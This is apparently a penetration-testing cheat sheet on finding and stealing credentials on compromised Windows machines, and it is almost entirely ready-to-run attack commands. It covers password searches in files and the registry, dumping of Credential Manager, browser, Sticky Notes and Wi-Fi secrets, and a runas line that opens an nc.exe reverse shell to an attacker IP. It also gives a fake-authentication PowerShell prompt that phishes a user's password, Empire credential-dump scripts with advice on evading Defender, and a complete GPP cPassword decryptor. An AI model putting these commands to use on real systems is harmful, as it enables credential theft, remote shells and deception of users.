# Password/File Hunting

## General

{% tabs %}
{% tab title="CMD" %}
```shell
# List all shares:
net use # If there is a shared resource, we can search there as well.
# Search by filename:
dir /b /a /s c:\ > files.txt
type files.txt | findstr /i "<WORD>"
dir /s *pass* == *.config
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.conf*
dir /b /s user.txt # Search, from actual dir, for the file user.txt.
where /R C:\ user.txt # Search, from dir C:\, for the file user.txt.
where /R C:\ *.ini
where /R C:\ *.bak*
# Search for file contents:
findstr /si password *.xml *.ini *.txt # Word "password" in .xml, .txt and .ini files
findstr /SI /C:"password" *.txt
findstr /SI /C:"password" *.xml
findstr /SI /C:"password" *.ini
findstr /SI /C:"password" *.cfg
findstr /spin "password" *.* # Word "password" in all files.
```
{% endtab %}

{% tab title="PowerShell" %}
{% hint style="info" %}
`Get-ChiIdItem` = `dir` (PSH alias)
{% endhint %}

```powershell
# Search for a file with a certain filename:
dir -Path C:\ -Include <EXPRESSION> -File -Recurse # Get-ChildItem -Path C:\ -Include *.xml -File -Recurse
dir C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
# Search for file contents:
Select-String -Path C:\Users\* -Pattern password
```
{% endtab %}

{% tab title="winPEAS" %}
```shell
winPEAS.exe quiet filesinfo userinfo
winPEAS.exe quiet cmd searchfast filesinfo
```
{% endtab %}

{% tab title="Files" %}
```bash
# Keywords for filenames:
install, backup, .bak, .log, .bat, .cmd, .vbs, ,cnf, .conf, .config, .ini, .xml, .txt, .gpg, .pgp, .p12, .der, .csr, .cer, id_rsa, .id_dsa, .ovpn, vnc, ftp, ssh, vpn, git, .kdbx, .db
# Filenames:
unattend.xml
Unattended.xml
sysprep.inf
sysprep.xml
VARIABLES.DAT
setupinfo
setupinfo.bak
web.config
SiteList.xml
.aws\credentials
.azure\accessTokens.json
.azure\azureProfile.json
gcloud\credentials.db
gcloud\legacy_credentials
gcloud\access_tokens.db

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
{% endtab %}
{% endtabs %}

## Registry

```shell
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password # VNC credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*" # En PS
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP Paramters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty
reg query HKLM /f password /t REG_SZ /s # Search for password in registry
reg query HKCU /f password /t REG_SZ /s # Search for password in registry
```

## Credential Manager (SaveCreds)

Windows has a runas command that allows users to execute commands with the privileges of other users. This usually requires knowledge of the other user's password. However, Windows also allows users to save their credentials on the system using something called Credential Manager, and these saved credentials can be used to bypass this requirement. If the runas command is not found, we can try uploading a binary.

{% hint style="info" %}
`runas.exe` is a handy Windows tool that allows you to run a program as another user as long as you know your password.
{% endhint %}

The Credential Manager, in the "Windows credentials" section, has 3 categories:

* Windows Credentials: can only be used on Windows, and can contain credentials for a user account or service for an interactive session.
* Certificate-Based Credentials: are used in conjunction with smart cards. It is very rare to come across any credentials in this category.
* Generic Credentials: These store credentials from applications such as Microsoft Office, One Drive, Slack, etc.

{% tabs %}
{% tab title="Verification" %}
### Manual

```shell
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

The cmdkey command can be used to create, list and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without the need to enter a password. This can help us move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.

![](../../../.gitbook/assets/cmdkey\_list.png)

### GUI

Search "Credential Manager":

![](../../../.gitbook/assets/credentials\_manager.png)

### winPEAS

```
winPEAS.exe quiet cmd windowscreds
```
{% endtab %}

{% tab title="Privilege Escalation" %}
### #1. runas.exe

We can use the saved credential to run any command as that user. We can do several things, such as uploading nc.exe or a malicious reverse shell generated with msfvenom:

```shell
C:\Windows\System32\runas.exe /env /noprofile /user:<USERNAME> "c:\users\public\nc.exe -nc <IP> 4444 -e cmd.exe"
runas /savecred /user:<HOSTNAME>\<USERNAME> <PATH>\shell.exe
runas /savecred /user:<HOSTNAME>\<USERNAME> /profile cmd.exe
C:\Windows\System32\runas.exe /user:<USER> /savecred "C:\Windows\System32\cmd.exe /c <COMMAND>"
```

### #2. Remote Desktop

When attempting to RDP to the host, the saved credentials will be used:

![The "Computer" will be the Target.](../../../.gitbook/assets/remote\_desktop\_savecred.png)
{% endtab %}

{% tab title="Extract" %}
It is possible to extract the credentials in clear text from the Credential Manager.

### vaultcmd.exe

```
vaultcmd /listcreds:"Windows Credentials"
```

### dumpCredStore.ps1 (Empire)

```powershell
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/dumpCredStore.ps1
# Transfer module to compromised machine.
Import-Module .\dumpCredStore.ps1 ; Enum-Creds
```

{% hint style="info" %}
This script can be obfuscated to avoid detection by AMSI and Windows Defender.
{% endhint %}
{% endtab %}
{% endtabs %}

## Web Server (configs files)

```powershell
# General web config:
C:\inetpub\wwwroot\web.config
# IIS Web Config:
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

## Chrome Dictionary Files

Another interesting case is dictionary files. For example, sensitive information, such as passwords, can be entered into an e-mail client or browser-based application, which underlines words it does not recognize. The user can add these words to his dictionary to avoid the annoying red underlining.

```powershell
# PowerShell:
gc 'C:\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## Sticky Notes

People often use the StickyNotes application on Windows workstations to store passwords and other information, not realizing that it is a database file. This file is located in:

```shell
# File location:
C:\Users\<USERNAME>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
# Other files
> ls

Directory: C:\Users\leviswings\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/14/2022  00:30 AM          20181 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         7/14/2022  00:30 AM            845 Ecs.dat
-a----         7/14/2022  00:30 AM           5034 plum.sqlite
-a----         7/14/2022  00:30 AM          33945 plum.sqlite-shm
-a----         7/14/2022  00:30 PM         18924 plum.sqlite-wal

# Search:
cd C:\Users\<USERNAME>\AppData
dir -recurse | Select-Object FullName | Select-String "Sticky"
```

Read credentials:

```shell
# Method #1:
type plum.sqlite | Format-Hex
type .\plum.sqlite | Format-Hex | Select-String ":"

# Method #2:
## - We transfer the files to our machine.
strings plum.sqlite

# Method #4:
## - We transfer the files to our machine.
sqlite3 plum.sqlite
SELECT Text FROM Note;

# Method #4 (PSSQlite):
## - We transfer the files to our machine.
git clone https://github.com/RamblingCookieMonster/PSSQLite
cd PSSQLite/PSSQLite
pwsh
Set-ExecutionPolicy Bypass -Scope Process
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
Import-Module .\PSSQLite.psd1
$db = '<PATH>\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

## Browser Credentials

{% tabs %}
{% tab title="Chrome" %}
**Retrieving Saved Credentials from Chrome**

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```shell
.\SharpChrome.exe logins /unprotect
```
{% endtab %}

{% tab title="Firefox" %}
Methodology for cracking Mozilla-protected passwords using open source tools:

```bash
# Method 1:
## Download: key4.db and logins.json
git clone https://github.com/lclevy/firepwd && cd firepwd
python3 firepwd.py key4.db logins.json
python3 firepwd.py key4.db
```

```bash
# Method 2:
## Download: key4.db, logins.json, cert9.db and cookies.sqlite
git clone https://github.com/unode/firefox_decrypt && cd firefox_decrypt
python3 firefox_decrypt.py <DIRECTORY>
```
{% endtab %}
{% endtabs %}

## PowerShell History

Starting with Powershell 5.0 on Windows 10, PowerShell stores the command history in the file:

```powershell
(Get-PSReadlineOption).HistorySavePath # Get the Powershell history path of the current users.
gc (Get-PSReadLineOption).HistorySavePath # Read current history file
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt # Read current history file
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt # Check the Powershell history of all users
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue} # Check the Powershell history of all users
```

## Phishing

With a PowerShell oneliner, we can show the user a window to make him think that authentication failed and that he needs to enter his credentials.

```powershell
powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

![](../../../.gitbook/assets/ps\_phishing\_theft\_cred.png)

If the user enters the credentials, we will see it in our console.

## Others

{% tabs %}
{% tab title="Wifi Passwords" %}
**Viewing Saved Wireless Networks**

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

```shell
netsh wlan show profile
```

**Retrieving Saved Wireless Passwords**

Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.

```bash
netsh wlan show profile <PROFILE> key=clear
```
{% endtab %}

{% tab title="Unattended Installs" %}
Unattended installations allow administrators to deploy Windows without any intervention. However, if they do not clean up after this process, an XML file called Unattend is left on the local system, full of configuration settings and possibly local account (e.g., administrator) settings. The passwords in the `unattend.xml` are stored in plain text or base64 encoded. Unattend files are usually found in these folders:

```bash
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
c:\sysprep\
```

Common file names:

```bash
# Note: The passwords in these files may be base64 encoded:
unattend.xml
Unattended.xml
unattended.xml
sysprep.xml
sysprep.inf
```
{% endtab %}

{% tab title="GPP cPassword" %}
Group Policy Preferences allowed administrators to create policies using embedded credentials. Those credentials were encrypted and placed in an XML file (called **Groups.xml**), and is located in a part called "`cPassword`". Its encryption type is AES-256-cbc and is usually located in the **SYSVOL folder** at the SMB level. The key was accidentally dropped (whoops). Patched in **MS14-025**, but does not prevent previous uses, i.e. if you had an old Windows Server, where you already had the `cPassword`, and then patched it, it doesn't matter, because it's still there. Here is an [article](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/).

### Manual

* Find the `Groups.xml` file or an .xml file, which is usually located in the Preferences directory. Here is an example of the file:

![](../../../.gitbook/assets/groups\_xml.png)

* We can see that we have a user account named **SVC\_TGS**, which refers to a TGS service with its **cPassword**.
* To decrypt the **cPassword,** we can use the `gpp-decrypt` tool:

```bash
# Installation:
sudo apt-get install gpp-decrypt # Kali/Parrot
wget https://raw.githubusercontent.com/BustedSec/gpp-decrypt/master/gpp-decrypt.rb # Others SOs
# Use:
gpp-decrypt <cPassword>
ruby gpp-decrypt.rb # Remember to open the file and put the cPassword in the "encrypted_data" variable.
```

#### Code

```ruby
#!/usr/bin/ruby

require 'rubygems'
require 'openssl'
require 'base64'

unless ARGV.length == 1
  puts "Usage: #{File.basename($0)}: encrypted_data"
  exit
end

encrypted_data = ARGV[0]
#encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

def decrypt(encrypted_data)
  padding = "=" * (4 - (encrypted_data.length % 4))
  epassword = "#{encrypted_data}#{padding}"
  decoded = Base64.decode64(epassword)

  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
  aes.decrypt
  aes.key = key
  plaintext = aes.update(decoded)
  plaintext << aes.final
  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

  return pass
end

blah = decrypt(encrypted_data)
puts blah
```

In addition to Groups.xml, other policy preference files may have the optional "cPassword" attribute:

```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Impresoras\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```

### Metasploit

```bash
auxiliary/scanner/smb/smb/smb_enum_gpp
# Change the SMBShare to another available folder, such as IPC$, ADMIN$, etc.
```

### PowerUp (PowerShell)

* Upload `PowerUp` file to the machine:
* Run `Invoke-AllChecks` or `Invoke-GPP`.
{% endtab %}
{% endtabs %}

